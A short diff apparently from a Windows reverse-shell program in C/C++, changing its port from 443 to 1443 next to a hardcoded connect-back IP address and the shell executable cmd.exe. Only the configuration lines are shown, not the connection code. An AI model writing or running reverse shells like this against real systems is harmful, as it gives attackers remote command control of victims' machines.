@@ -20,7 +20,7 @@ int main() {
 
 	// Change IP, port and shell executable if required
 	const char* ip = "192.168.1.249";
-	int port = 443;
+	int port = 1443;
 	wchar_t process[] = L"cmd.exe";
 
 	// Typing this Cmd will cause the program to terminate
